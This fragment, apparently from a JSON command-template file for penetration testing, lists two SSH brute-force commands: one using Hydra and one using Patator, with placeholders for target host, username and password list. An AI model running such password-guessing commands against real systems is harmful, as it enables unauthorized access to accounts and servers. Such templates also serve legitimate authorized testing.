      "Hydra: Brute-Force Password": "hydra -l '$USERNAME' -P $PASSWORDS ssh://$RHOST",
      "Patator: SSH Key Brute-Force": "patator ssh_login host=$RHOST 'user=$USERNAME' password=FILE0 0=$PASSWORDS"
